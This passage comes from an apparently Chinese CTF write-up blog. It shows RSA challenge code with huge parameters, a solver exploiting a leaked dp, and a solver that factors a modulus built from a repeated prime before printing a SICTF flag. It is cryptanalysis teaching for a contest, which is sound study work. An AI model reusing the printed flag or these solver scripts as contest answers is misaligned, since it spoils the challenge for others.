7771256008656450296183884491251752111424531449198118292179798490440493223653950102915889401116251591885909790869073018774674246846164536910633015902964911907187085243240032540938841961345835517368130042501382327926289017383981908729734129193302049155793436988510517701765733605569135643208447952662352778482137713239592896997102366230279153456455232519301534222340901671138239539845240151878610363390683459663471954623868659324304077587611084188341121303918876492043578883059738615210439439368338460631574255417822627815523601923537626576677004085017875860928802762176477815284840936951142176532768517728636562256240668409525184886142801802825451465440993457022771077957094228957592122319682216294509338262739872163482972508991702525289361105971574659126127296233247905505496525683817711366704746617027744889413904684867577081667137187623825349410229389484199608739864221035985277681307389939848405790294473878622092200837753161101695539947514614727699952200114544362051873938505591469240465379091377837297561323297393518152524513948294475770774872596601345526469590486037386767964812631618224527233850818909346007449756779707319609915127618828551910681421647307180399632857248867655836894968134457622987954781685664833951774981383914013420724637676787907498490619865488706542422141338754933476190313653530739822029700217857534243473680585150263523947891501341441371965435851479670882202992955935279933652356336270251591324623898094984119190752775236005057405257945038031382867511822173122001309505728526596893926445291712035117553637589190292816001770554129840326832888707541999454791653742647879694585329112697382151447923691770809327807665376014114552626285289291808032845544905356380497227622738746307685611140483875177839511922977657045680353723672792411661489242162646272105649970359134277499907207906149573299990033858943215801954126448693460102775418225293255402758159431943811872373682053160944887775375465971432320964554947377318554518275854303099420999992690990916801757184853847474379621177976926681977371922191722085164910430032177320954341986984523594583172470609743970245810969858512632597943721628165724329447516823159387734220282510185959768239630017162115072758419177056571781075148374822721899683720488356041096248563880547752710289151512607087038310649235610688255059182467964379544134070766646863815775576049106337955345150055151813028534690066771104188418296440067303355417210829440978858599306487361626723932883675404705319649877631289465547597225908934420304867048341698308940436377375588905463549199568800788130324653074398891097223958392703515180958466771395566567923630440881986781120062769327993137151783189811570714391264155060840731029466593405853721833971303821804104382800673631786729744779165371433211267361024896576031556979771007693215198547296582235167582106419779580693225211695215406540025468141235241168387527901851774993867055740692835931115312659500713701652905802357951993290979099170159167009106534001226859533836082801229997337966972579186548771169099646656172882424089451273021293821026173210665095782802709874946641962115525841325300318524665386511421662860490620819561338110623774842340380068922415609137358448899126553279894950604871889208579886778999174405582160576479554324208876082033912031737086248121899303730781498156597249803927142235444644481388064486155431912003641095674949903404176810866307571531389637794147871012904134653569388493652441432759092336752228939764110397029831387803943394811558386122839568158928461007578259968765727092577006588264867960486472014493774664081407186721351852883527145790575242285664659303948842228766554243966691396492391152581830022133814454196259968655735361775914705332258892954614272244452518449260489348504449204461418971768011384340273291232094176572232837038670467853897665877851434992557429017504229337778470080893449423405491607587635438331476572996201482633587271479001915768182336813417460145272910780420062773057289352127058606048428315185624554551172152106354445240590380140756355226376829443068190672329776832112173322011137862590548721676059398379694994522794474774534579546109677615257696703950497332824299576069196330271666459758430542051969093680846765661685489556479825015505460585577388300005030240514448617715276600874290664416888184557142542207029827016362686924883704397874129412267949416733492080843315519912943048041880665442664534980370689081266908497051077237188221752059058912835617635691061804481035908317765279937217591432632832678806430381325340000898958680468694182993189208039459712391492410123386884340504648296815916980264240229859574883155040793388439699245314010536014311134726579595932201351264754211113984594974123575279085420654342347792446273359397655783349850267895960713020361459104930811498666622216299579774939159380045958811891996366190154624989040001455252320159516822116133341010157165599727635333348456688307169980804760876207246783116588952529877373514768545007418968307885769960168050996962066803264260375707466369627458024513973771207018864983698407016663019106354023164759250846073414341438963394719456500998324900154652118420207057668806120330181700845296117532235012372135050553397046174401449323031309344766628888675704109715329046692002106076405553528413866402862565543443907259825033515101841485790388106868972724754988229771779715569516295419556055234476868558577442887306482605945053829666543946452255290321024138948999088611233226734197091325915223296133751626031378197131875533631358612215053149934608672729194446883476706267066475008836864936670808320239466055935088929279252129128009704233352664523535820092988950793050907265677092793104426094212209504897403359406325045852228354350509453013015487815230129380079713113632363881496974185547766115624580099624722897692297760495094913178120692467666707678647081180656345151015995338390986674404981831649353833607305738823436744297628382797810952028446046016233612873716789383675779820186248250486000672269630344269347652027789034023080859790238772676504723029078903218723114249502157501775936110552413022658586833869562215506206204712447588632398550497708640229614956652263449460598992811393334042395804931240940416629178335447861485028284981615219874331354750385150254017244750993573994159458909546341067039268159319391512934162794663414200907868505060542602841564239761181077333990423542820064315891665379550720216448942932714180923613869070005330476506812100063599659432570925437054287120906048730323556681557905787470647037629769660028387819741611799183349496549168370221978146678987457271259655273299546276899538032070218474555442304430064164467753804089753466882786069297036926063093020795423414152340563079346797084488827259011515774643776620378827875819192074121522712821147817374988804339999134520633699074448564057555026364304855373068414955699295158212425760345481057281658337956841137897162198027254556350868502178340964817530029135654659162400076087528650997151875596189190736466304722028587441680622878918057024286243448077104494316372739218635221411755498456912672491099154558604384574583302548226057069534004474532514444674565766058970748694657151540644416463532338966570743112669782840065402131461088637463019996192189423665651801811614499041923273110971446683450048861113332787126098622974613883291506736280588039145040361795192519576202306796277888696719887642051327259799873478040156450250036778305950744573270786882726162630115640020293415918210448873867037875790399234972055537649774407094382744621251926131880807765203843946682834221238903263352845265134368550124026502981782369374484091775137498831749984649699756860976525160646445060537001</span><br>c = <span class="hljs-number">25311588269686177955448734593829241225577179988164713941852977611031657483354358211703127234256857543045931490595235462694154500286504335321863566904591526587164297277540588019404183750093303030110155964308233155625979213391426577001127732161793532171930032372311485789800839135378584125843945003217786635500780784536181313697728354510921343049319891609423580951127082479154042124088536642353812516362473763243425336498681024731131013712158320926550826023277898283823992258572884077276506953901984370413493389421701244517177275694290580595883324705204426546600360091062972293159479880268240701929584137714053692704173792703744319619320692061092061615202753943135058204637610994232168818081462863915909261100211958674543647005416235222620606212841753586419836448681445654681389951211124603287962397164672343026391101395393442103086256726266031275710666309840451443110824175976964355109239201609721120961810198879456321855222352235065257082872600438604687617267718725588993464084147695037610145634237788526691386358596867368523164061114195245860062033244276270480267737617206612775486335779851309426638789250166900931784751600508190450785806340839297468432626354823268011108399699249876358363866293469899572158837757748629586492339783888456600259136387616777593894789302431752391447333278000811521062096467397501227651566498970779080811188805992370970942403208432494393387894197176720244315639559895616799551357601688597541585709039366190088117378880414928532937085490713336140523926983900188378021593225550131993528275166272215028510435690944582596557549068715312515919059333916941744937308255671959764859162487792658274812322891679161915480098864709106347357292015949882243095564999283630289876842913558415205967734452657944991350268108202225952952066459093168792825684626405271617613362070897142103054139806566495183172335794957308822648116537830567396971238329939142829563169355194093529211071160078683833491919940022871862059981346961003867620542620578917684687869682550269127226291011607064545739386850054846167307744022708831833252517778607796258598290908139274345221343651583618249287308738279011682960787460189183445095638164116734700624496711487227176740828397696295620232796356005136058517828311139839381424066302086111930635998143063033446131859852797958765199173807715541045956108285596958780742834805533223538366354327087736088500599094358107164689423572964793385788194218918919596478862097292477628426360333874314260108133339375942666508606311391805252966277961758108821946154428477616100004321457604879220523742427633323872953699931521980332026241531049474031438142792394628576016121322036294740176980189940853036679375845577017978783071015970829136676221389585848058189544793760570196797629432282672371000290840492119720433350192833648839794730598188620374416865232426658538841900897108162173580739323675324880778494924038982358349531848197090990541020708295116156624389135273650491811601011636903928586011504526431498652011548693157985029456398851189821020778958527809174433156243544030624341915713810661287037659586018768085470670240790942171506843637271442721823608266490364627429331023698199955218456371716269004979764982383921294842864121196124699402037204598504310969390789092001114319822852242500941141355281693725110460506548426263105213498404197519606615831672853931646583757742145492562101250546593997874586076926641241047317510838024042147508770595175718146175716833867781581245298658392175502069483979736336330731124942036757071709086638075284655589787868565023763734664219353940143820183318534640360506287779208468427268377183973501528333749816003855834863565394122448191029578528511650194632623989208637401008114422451686312319644054514944700566430912835340518601698767128195833704182657730566589247891277627101027106635732998136735398078858899384713118593668984773592904704131402905145754570091966901120411201405256435232063295790833161132002246279663161388421997242226907126829858922174709653627696146355472690262198127338971112610753839661677080463775112411884196230185877234066728564716929551607129141735155379529048300204700285511666205204686244751557147684338591300111406075976759988295937870045743031816067994768915303111125253664865369863586807234945352445045026501495849671447691502253489642657652848949102823407762108943161789244134119866441040670840037015617307056821150285453994199024947457774647253618512995677313792036106100497936654142008173389260345411854520383366800831542339243757421033121103167943520915885043698882609693007629591093225819727653240183003450339802857059736870645197609170799838610316307123146927966669912638227587517396282910946355194781275415343491170583392480153599086125374051844306869510079152461763122622668280249192047024784624692776244265874153473114993619019113474166958126841368545758693832786756946298833891033171752534079387364641021835311861509609494125593285947444939996542402774020507531158198766149282993994638607458820211163623309687149807339960007614766879688676462400606899851539023671152038536934433128973358637812907001112093086713949701646964777013925616637956114825918525229968119306607256312727518429074253193934915609865400118400124334806320033990630595454381780378123232633134565408152216410478497582716891919477755736223636583493709691482948793995974775520709337409910573358960632077245564017495103173982250506224927848890977671698731337737945862469303397352291579706358090437359126171980555387033997507170208063868788685780633727495158542911276981383764698030088894904043298340184342818716278091407356551940358010532738356144600648671870141201656260882560550096111259047730234565173017875969390130055742832375612379167064701421263006004472414998830886590121784525812803198481744263349186310137594023961272959521982892804372412802448375074058059953851751721276448647238818757245128139844126234490887064897176175605991477364838775902549049484485649550475857257115219540606931472558004890564503134870490140656624241401747198540715275804941032074573356860460172868340373583692584902872979221114982298050586685719887060873413850621645519128954022253850929825608263273096476942591333367968509790925478388960974334157155990587259664085903377635645971389261554405014491809856113962072321115329323751880850245450855429733690986687462514539793256111238991830404264833945950057548041347552265351912075406068254301589527368376552057750656888595867048015012255350060023438752477068307445956245683183096512267217891149812719686622381240260466772552889788641876064057960173837664029586196731436456574414559972320705400861271592462379875676277251086312872195716024719468847393778892154498344296554136868868732950910162390521996660833516010868267341539744299603050842530651780425947531816479566426165422123252285427076862067553260240357395991463485011778125635347076641337205162163658915958257879189951068432591492287483129944125287963913713736174143726754563437013760958618334477377727596918588685928884428267449422751775309153821164066157157127578931430789782791432466972743083256930846560916380022935439074194208587413499830348721004306047843916090382879427208653946874404416581482497419737465638158237340330822703573665318917667360471294611610224794247546701801044290825387969994925735165223021550294577211312086169077389985367351707099712483698243658870007261177946508698830792080087400145468466457013023648585707831661968993789151545051681008263293021078693138432668411562842904645661356499891588207831214182852485507569391094080770281546830762172075737108196782354642073491890672014845707320966391491467609280627047834838773416130380735074488364271149543425149101272213833983451690912775914099688310078028317868139895586469648241691434390559738020665790535748911667198341478329818172050103593169144077713081858968945277802911631514524770516773987691162846774892828407010262766598402873965272708201519043339930474621748065360132998861911090097210247744181877811558047691563490093112810880988416880859363631693862441291401344868362517958157134815632633152101164792211199872770004214575342556751954753067436057216989105115974894826691301734658752554796336087163153087013755182247902851847839867807219615044427616326518986674768302109569955218389569458769985874451273117138435546665024826358058600551523916808015505037962468350942106702503883112975634757971636535249998962164886704286732345711210362931312187319836001555348202695806282730945501510756659164231139623277954192087899140537284122009070763979073048837471984618684020674370221463294306239424220412900401460550783283591789801735401367473630854684306273273881688896021682911944793729874921181848098382943970467341811398482121657330781393699096796050290808604481724879698091852697163383826854575487201365106673196811573729247280577781500366763330567122007588833805912087009446499739562463428568952248234506507069953596589309728265145195922268165106056450388840269349409588020300011340940321969965833519126936472969929255823540027083032424724503173052044192907375974391257436211908641463947719594493311129179150043015816776680636855703407557636501711566215605658114055289137679940955</span><br>e = <span class="hljs-number">19458216662993202562182929756256684791318810848802754020883513588583377528821730559897870095442161189229950925325157413999927847684731484753811988111830295294129447423655650029218971567158117911790213848402209470536199246476182240248742771389082526603384625792117047996128232952372477895218147279573573322975526303267821446640338606290250958710008158544852602338088244940388562828263436457418528981476220691508040085291576643321726669065360399003917048894093458055139757991688086912143763420958307099065105543361779847689716282373299487102518794317683805758527645283956734672229827240143254092779918701447288342107763</span><br><br><span class="hljs-comment">#************************************hint**************************************</span><br>M = libnum.<span class="hljs-title function_ invoke__">s2n</span>(hint)<br>P = <span class="hljs-title function_ invoke__">getPrime</span>(<span class="hljs-number">512</span>)<br>Q = <span class="hljs-title function_ invoke__">getPrime</span>(<span class="hljs-number">512</span>)<br>N = P * Q<br><span class="hljs-keyword">print</span>(<span class="hljs-string">&quot;N=&quot;</span> , N)<br>E = <span class="hljs-number">65537</span><br>dp = (gmpy2.<span class="hljs-title function_ invoke__">invert</span>(E,(P-<span class="hljs-number">1</span>)*(Q-<span class="hljs-number">1</span>)))%(P-<span class="hljs-number">1</span>)<br><span class="hljs-keyword">print</span>(<span class="hljs-string">&quot;dp=&quot;</span> , dp)<br>ct = <span class="hljs-title function_ invoke__">pow</span>(M, E, N)<br><span class="hljs-keyword">print</span>(<span class="hljs-string">&quot;ct=&quot;</span> , ct)<br><span class="hljs-comment">#N= 154243858720978602820118866455277758287334223654318945323956633685668127012462551649034724900534326698546179107853501584676890290935304784613676008667655919749627682648852472398117930471389759979432279103098572267738634433626627146280660185675121614094399255782089060202532182667463993275434746386786808729553</span><br><span class="hljs-comment">#dp= 414447829724187823397808703878958757693775250832414113550357728233230359464880433113636330432984183165483109337095394192757735932571515450285102727598243</span><br><span class="hljs-comment">#ct= 107353143319003715532284973064969905174389167949274067058206046773012002421251301189097709121034091973243342582216724329271495555062882075119176838856174054763892910473175610614629226628025470613930226188506099489500606701109022668507012376482339056160636468427364776216626364765166621843217027512464383836160</span><br></code></pre></td></tr></table></figure><p>hint是dp泄露，先跑</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs php">import libnum<br><br>n= <span class="hljs-number">154243858720978602820118866455277758287334223654318945323956633685668127012462551649034724900534326698546179107853501584676890290935304784613676008667655919749627682648852472398117930471389759979432279103098572267738634433626627146280660185675121614094399255782089060202532182667463993275434746386786808729553</span><br>e= <span class="hljs-number">65537</span><br>c= <span class="hljs-number">107353143319003715532284973064969905174389167949274067058206046773012002421251301189097709121034091973243342582216724329271495555062882075119176838856174054763892910473175610614629226628025470613930226188506099489500606701109022668507012376482339056160636468427364776216626364765166621843217027512464383836160</span><br>dp= <span class="hljs-number">414447829724187823397808703878958757693775250832414113550357728233230359464880433113636330432984183165483109337095394192757735932571515450285102727598243</span><br><br>p=gmpy2.<span class="hljs-title function_ invoke__">gcd</span>(<span class="hljs-title function_ invoke__">pow</span>(<span class="hljs-number">2</span>,e*dp,n)-<span class="hljs-number">2</span>,n)<br><span class="hljs-keyword">for</span> i in <span class="hljs-title function_ invoke__">range</span>(<span class="hljs-number">1</span>, e):<br>    p = (dp * e - <span class="hljs-number">1</span>) <span class="hljs-comment">// i + 1</span><br>    <span class="hljs-keyword">if</span> n % p == <span class="hljs-number">0</span>:<br>        q = n <span class="hljs-comment">// p</span><br>        <span class="hljs-keyword">break</span><br>phi_n = (p - <span class="hljs-number">1</span>) * (q - <span class="hljs-number">1</span>)<br>d = gmpy2.<span class="hljs-title function_ invoke__">invert</span>(e, phi_n)<br>m = <span class="hljs-title function_ invoke__">pow</span>(c, d, n)<br>flag = libnum.<span class="hljs-title function_ invoke__">n2s</span>(<span class="hljs-keyword">int</span>(m))<br><span class="hljs-keyword">print</span>(flag)<br><span class="hljs-comment">#Alpha == 8</span><br></code></pre></td></tr></table></figure><blockquote><p>代入计算， n约等于 (8<strong>16)*(128</strong>32)*(4096**2)*p**58，只有一个未知数p，解方程可以得到一个在p附近的数，在这个数的前后爆破一下即可得到p。p的长度为512bit大于flag的长度，所以RSA模p</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs php">import gmpy2<br><span class="hljs-keyword">from</span> Crypto.Util.number import *<br><span class="hljs-keyword">from</span> sympy import *<br>n = <span class="hljs-number">510598540378970007468346322989879190780475356832709189528874695730531468123747091318830966440138615736420891392158097533731041150162690662471483619765171875053776526546923686545162088172326434280369545887080098691661618888498451216122577703462656147845476260802989936275927468143618457014875124540773380472942489037761179303561650189545290190421786318533073909424735517884608967725919128200358535113829753453601297612782921831305721998858231417374167746154206561475003022801732102170674160043866579234096945753255309604584663823273990392197858273029361669185072049422597132579136784027822968387907216366150999438414498332890674564920800382005582891491049365978733797356415518435343495821039314228388769356638637099572998812062355774848959446125701462950655806332002764535951282449862140062574418031213788534096501985200284615865248974807525604893147298611402252296159828500266098282909607218395957805357667923653409828275804406466185333491486073920384298557332939701611488655278812282652143513835104674009767479927241052662403578967182673338296967573503287747778401579267126898937724971226916836862238412923209155792382534204896050548824028658237640251964366961727999178646613907934616655737902329568420682808750546571786374023614255135110482419627491157502417864563832543812083026753673687664854910877686333766643694031564516722983669199704788291656757271915091399977189663329054202997146978631991467923388119989473941572476162990901960011968892272676827771256008656450296183884491251752111424531449198118292179798490440493223653950102915889401116251591885909790869073018774674246846164536910633015902964911907187085243240032540938841961345835517368130042501382327926289017383981908729734129193302049155793436988510517701765733605569135643208447952662352778482137713239592896997102366230279153456455232519301534222340901671138239539845240151878610363390683459663471954623868659324304077587611084188341121303918876492043578883059738615210439439368338460631574255417822627815523601923537626576677004085017875860928802762176477815284840936951142176532768517728636562256240668409525184886142801802825451465440993457022771077957094228957592122319682216294509338262739872163482972508991702525289361105971574659126127296233247905505496525683817711366704746617027744889413904684867577081667137187623825349410229389484199608739864221035985277681307389939848405790294473878622092200837753161101695539947514614727699952200114544362051873938505591469240465379091377837297561323297393518152524513948294475770774872596601345526469590486037386767964812631618224527233850818909346007449756779707319609915127618828551910681421647307180399632857248867655836894968134457622987954781685664833951774981383914013420724637676787907498490619865488706542422141338754933476190313653530739822029700217857534243473680585150263523947891501341441371965435851479670882202992955935279933652356336270251591324623898094984119190752775236005057405257945038031382867511822173122001309505728526596893926445291712035117553637589190292816001770554129840326832888707541999454791653742647879694585329112697382151447923691770809327807665376014114552626285289291808032845544905356380497227622738746307685611140483875177839511922977657045680353723672792411661489242162646272105649970359134277499907207906149573299990033858943215801954126448693460102775418225293255402758159431943811872373682053160944887775375465971432320964554947377318554518275854303099420999992690990916801757184853847474379621177976926681977371922191722085164910430032177320954341986984523594583172470609743970245810969858512632597943721628165724329447516823159387734220282510185959768239630017162115072758419177056571781075148374822721899683720488356041096248563880547752710289151512607087038310649235610688255059182467964379544134070766646863815775576049106337955345150055151813028534690066771104188418296440067303355417210829440978858599306487361626723932883675404705319649877631289465547597225908934420304867048341698308940436377375588905463549199568800788130324653074398891097223958392703515180958466771395566567923630440881986781120062769327993137151783189811570714391264155060840731029466593405853721833971303821804104382800673631786729744779165371433211267361024896576031556979771007693215198547296582235167582106419779580693225211695215406540025468141235241168387527901851774993867055740692835931115312659500713701652905802357951993290979099170159167009106534001226859533836082801229997337966972579186548771169099646656172882424089451273021293821026173210665095782802709874946641962115525841325300318524665386511421662860490620819561338110623774842340380068922415609137358448899126553279894950604871889208579886778999174405582160576479554324208876082033912031737086248121899303730781498156597249803927142235444644481388064486155431912003641095674949903404176810866307571531389637794147871012904134653569388493652441432759092336752228939764110397029831387803943394811558386122839568158928461007578259968765727092577006588264867960486472014493774664081407186721351852883527145790575242285664659303948842228766554243966691396492391152581830022133814454196259968655735361775914705332258892954614272244452518449260489348504449204461418971768011384340273291232094176572232837038670467853897665877851434992557429017504229337778470080893449423405491607587635438331476572996201482633587271479001915768182336813417460145272910780420062773057289352127058606048428315185624554551172152106354445240590380140756355226376829443068190672329776832112173322011137862590548721676059398379694994522794474774534579546109677615257696703950497332824299576069196330271666459758430542051969093680846765661685489556479825015505460585577388300005030240514448617715276600874290664416888184557142542207029827016362686924883704397874129412267949416733492080843315519912943048041880665442664534980370689081266908497051077237188221752059058912835617635691061804481035908317765279937217591432632832678806430381325340000898958680468694182993189208039459712391492410123386884340504648296815916980264240229859574883155040793388439699245314010536014311134726579595932201351264754211113984594974123575279085420654342347792446273359397655783349850267895960713020361459104930811498666622216299579774939159380045958811891996366190154624989040001455252320159516822116133341010157165599727635333348456688307169980804760876207246783116588952529877373514768545007418968307885769960168050996962066803264260375707466369627458024513973771207018864983698407016663019106354023164759250846073414341438963394719456500998324900154652118420207057668806120330181700845296117532235012372135050553397046174401449323031309344766628888675704109715329046692002106076405553528413866402862565543443907259825033515101841485790388106868972724754988229771779715569516295419556055234476868558577442887306482605945053829666543946452255290321024138948999088611233226734197091325915223296133751626031378197131875533631358612215053149934608672729194446883476706267066475008836864936670808320239466055935088929279252129128009704233352664523535820092988950793050907265677092793104426094212209504897403359406325045852228354350509453013015487815230129380079713113632363881496974185547766115624580099624722897692297760495094913178120692467666707678647081180656345151015995338390986674404981831649353833607305738823436744297628382797810952028446046016233612873716789383675779820186248250486000672269630344269347652027789034023080859790238772676504723029078903218723114249502157501775936110552413022658586833869562215506206204712447588632398550497708640229614956652263449460598992811393334042395804931240940416629178335447861485028284981615219874331354750385150254017244750993573994159458909546341067039268159319391512934162794663414200907868505060542602841564239761181077333990423542820064315891665379550720216448942932714180923613869070005330476506812100063599659432570925437054287120906048730323556681557905787470647037629769660028387819741611799183349496549168370221978146678987457271259655273299546276899538032070218474555442304430064164467753804089753466882786069297036926063093020795423414152340563079346797084488827259011515774643776620378827875819192074121522712821147817374988804339999134520633699074448564057555026364304855373068414955699295158212425760345481057281658337956841137897162198027254556350868502178340964817530029135654659162400076087528650997151875596189190736466304722028587441680622878918057024286243448077104494316372739218635221411755498456912672491099154558604384574583302548226057069534004474532514444674565766058970748694657151540644416463532338966570743112669782840065402131461088637463019996192189423665651801811614499041923273110971446683450048861113332787126098622974613883291506736280588039145040361795192519576202306796277888696719887642051327259799873478040156450250036778305950744573270786882726162630115640020293415918210448873867037875790399234972055537649774407094382744621251926131880807765203843946682834221238903263352845265134368550124026502981782369374484091775137498831749984649699756860976525160646445060537001</span><br>c = <span class="hljs-number">25311588269686177955448734593829241225577179988164713941852977611031657483354358211703127234256857543045931490595235462694154500286504335321863566904591526587164297277540588019404183750093303030110155964308233155625979213391426577001127732161793532171930032372311485789800839135378584125843945003217786635500780784536181313697728354510921343049319891609423580951127082479154042124088536642353812516362473763243425336498681024731131013712158320926550826023277898283823992258572884077276506953901984370413493389421701244517177275694290580595883324705204426546600360091062972293159479880268240701929584137714053692704173792703744319619320692061092061615202753943135058204637610994232168818081462863915909261100211958674543647005416235222620606212841753586419836448681445654681389951211124603287962397164672343026391101395393442103086256726266031275710666309840451443110824175976964355109239201609721120961810198879456321855222352235065257082872600438604687617267718725588993464084147695037610145634237788526691386358596867368523164061114195245860062033244276270480267737617206612775486335779851309426638789250166900931784751600508190450785806340839297468432626354823268011108399699249876358363866293469899572158837757748629586492339783888456600259136387616777593894789302431752391447333278000811521062096467397501227651566498970779080811188805992370970942403208432494393387894197176720244315639559895616799551357601688597541585709039366190088117378880414928532937085490713336140523926983900188378021593225550131993528275166272215028510435690944582596557549068715312515919059333916941744937308255671959764859162487792658274812322891679161915480098864709106347357292015949882243095564999283630289876842913558415205967734452657944991350268108202225952952066459093168792825684626405271617613362070897142103054139806566495183172335794957308822648116537830567396971238329939142829563169355194093529211071160078683833491919940022871862059981346961003867620542620578917684687869682550269127226291011607064545739386850054846167307744022708831833252517778607796258598290908139274345221343651583618249287308738279011682960787460189183445095638164116734700624496711487227176740828397696295620232796356005136058517828311139839381424066302086111930635998143063033446131859852797958765199173807715541045956108285596958780742834805533223538366354327087736088500599094358107164689423572964793385788194218918919596478862097292477628426360333874314260108133339375942666508606311391805252966277961758108821946154428477616100004321457604879220523742427633323872953699931521980332026241531049474031438142792394628576016121322036294740176980189940853036679375845577017978783071015970829136676221389585848058189544793760570196797629432282672371000290840492119720433350192833648839794730598188620374416865232426658538841900897108162173580739323675324880778494924038982358349531848197090990541020708295116156624389135273650491811601011636903928586011504526431498652011548693157985029456398851189821020778958527809174433156243544030624341915713810661287037659586018768085470670240790942171506843637271442721823608266490364627429331023698199955218456371716269004979764982383921294842864121196124699402037204598504310969390789092001114319822852242500941141355281693725110460506548426263105213498404197519606615831672853931646583757742145492562101250546593997874586076926641241047317510838024042147508770595175718146175716833867781581245298658392175502069483979736336330731124942036757071709086638075284655589787868565023763734664219353940143820183318534640360506287779208468427268377183973501528333749816003855834863565394122448191029578528511650194632623989208637401008114422451686312319644054514944700566430912835340518601698767128195833704182657730566589247891277627101027106635732998136735398078858899384713118593668984773592904704131402905145754570091966901120411201405256435232063295790833161132002246279663161388421997242226907126829858922174709653627696146355472690262198127338971112610753839661677080463775112411884196230185877234066728564716929551607129141735155379529048300204700285511666205204686244751557147684338591300111406075976759988295937870045743031816067994768915303111125253664865369863586807234945352445045026501495849671447691502253489642657652848949102823407762108943161789244134119866441040670840037015617307056821150285453994199024947457774647253618512995677313792036106100497936654142008173389260345411854520383366800831542339243757421033121103167943520915885043698882609693007629591093225819727653240183003450339802857059736870645197609170799838610316307123146927966669912638227587517396282910946355194781275415343491170583392480153599086125374051844306869510079152461763122622668280249192047024784624692776244265874153473114993619019113474166958126841368545758693832786756946298833891033171752534079387364641021835311861509609494125593285947444939996542402774020507531158198766149282993994638607458820211163623309687149807339960007614766879688676462400606899851539023671152038536934433128973358637812907001112093086713949701646964777013925616637956114825918525229968119306607256312727518429074253193934915609865400118400124334806320033990630595454381780378123232633134565408152216410478497582716891919477755736223636583493709691482948793995974775520709337409910573358960632077245564017495103173982250506224927848890977671698731337737945862469303397352291579706358090437359126171980555387033997507170208063868788685780633727495158542911276981383764698030088894904043298340184342818716278091407356551940358010532738356144600648671870141201656260882560550096111259047730234565173017875969390130055742832375612379167064701421263006004472414998830886590121784525812803198481744263349186310137594023961272959521982892804372412802448375074058059953851751721276448647238818757245128139844126234490887064897176175605991477364838775902549049484485649550475857257115219540606931472558004890564503134870490140656624241401747198540715275804941032074573356860460172868340373583692584902872979221114982298050586685719887060873413850621645519128954022253850929825608263273096476942591333367968509790925478388960974334157155990587259664085903377635645971389261554405014491809856113962072321115329323751880850245450855429733690986687462514539793256111238991830404264833945950057548041347552265351912075406068254301589527368376552057750656888595867048015012255350060023438752477068307445956245683183096512267217891149812719686622381240260466772552889788641876064057960173837664029586196731436456574414559972320705400861271592462379875676277251086312872195716024719468847393778892154498344296554136868868732950910162390521996660833516010868267341539744299603050842530651780425947531816479566426165422123252285427076862067553260240357395991463485011778125635347076641337205162163658915958257879189951068432591492287483129944125287963913713736174143726754563437013760958618334477377727596918588685928884428267449422751775309153821164066157157127578931430789782791432466972743083256930846560916380022935439074194208587413499830348721004306047843916090382879427208653946874404416581482497419737465638158237340330822703573665318917667360471294611610224794247546701801044290825387969994925735165223021550294577211312086169077389985367351707099712483698243658870007261177946508698830792080087400145468466457013023648585707831661968993789151545051681008263293021078693138432668411562842904645661356499891588207831214182852485507569391094080770281546830762172075737108196782354642073491890672014845707320966391491467609280627047834838773416130380735074488364271149543425149101272213833983451690912775914099688310078028317868139895586469648241691434390559738020665790535748911667198341478329818172050103593169144077713081858968945277802911631514524770516773987691162846774892828407010262766598402873965272708201519043339930474621748065360132998861911090097210247744181877811558047691563490093112810880988416880859363631693862441291401344868362517958157134815632633152101164792211199872770004214575342556751954753067436057216989105115974894826691301734658752554796336087163153087013755182247902851847839867807219615044427616326518986674768302109569955218389569458769985874451273117138435546665024826358058600551523916808015505037962468350942106702503883112975634757971636535249998962164886704286732345711210362931312187319836001555348202695806282730945501510756659164231139623277954192087899140537284122009070763979073048837471984618684020674370221463294306239424220412900401460550783283591789801735401367473630854684306273273881688896021682911944793729874921181848098382943970467341811398482121657330781393699096796050290808604481724879698091852697163383826854575487201365106673196811573729247280577781500366763330567122007588833805912087009446499739562463428568952248234506507069953596589309728265145195922268165106056450388840269349409588020300011340940321969965833519126936472969929255823540027083032424724503173052044192907375974391257436211908641463947719594493311129179150043015816776680636855703407557636501711566215605658114055289137679940955</span><br>e = <span class="hljs-number">19458216662993202562182929756256684791318810848802754020883513588583377528821730559897870095442161189229950925325157413999927847684731484753811988111830295294129447423655650029218971567158117911790213848402209470536199246476182240248742771389082526603384625792117047996128232952372477895218147279573573322975526303267821446640338606290250958710008158544852602338088244940388562828263436457418528981476220691508040085291576643321726669065360399003917048894093458055139757991688086912143763420958307099065105543361779847689716282373299487102518794317683805758527645283956734672229827240143254092779918701447288342107763</span><br><br>np = (<span class="hljs-number">8</span>**<span class="hljs-number">16</span>)*(<span class="hljs-number">128</span>**<span class="hljs-number">32</span>)*(<span class="hljs-number">4096</span>**<span class="hljs-number">2</span>)<br>p = gmpy2.<span class="hljs-title function_ invoke__">iroot</span>(n//np,<span class="hljs-number">58</span>)[<span class="hljs-number">0</span>]<br><span class="hljs-keyword">while</span> True:<br>    p = <span class="hljs-title function_ invoke__">prevprime</span>(p)<br>    d = gmpy2.<span class="hljs-title function_ invoke__">invert</span>(e,p-<span class="hljs-number">1</span>)<br>    m = <span class="hljs-title function_ invoke__">pow</span>(c,d,p)<br>    flag = <span class="hljs-title function_ invoke__">long_to_bytes</span>(m)<br>    <span class="hljs-keyword">if</span> b<span class="hljs-string">&quot;SICTF&#123;&quot;</span> in flag:<br>        <span class="hljs-keyword">print</span>(flag)<br>        <span class="hljs-keyword">break</span><br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">continue</span><br><span class="hljs-comment">#SICTF&#123;6ee93ffd-e903-49d6-b166-44680a294851&#125;</span><br></code></pre></td></tr></table></figure><h4 id="xy"><a href="#xy" class="headerlink" 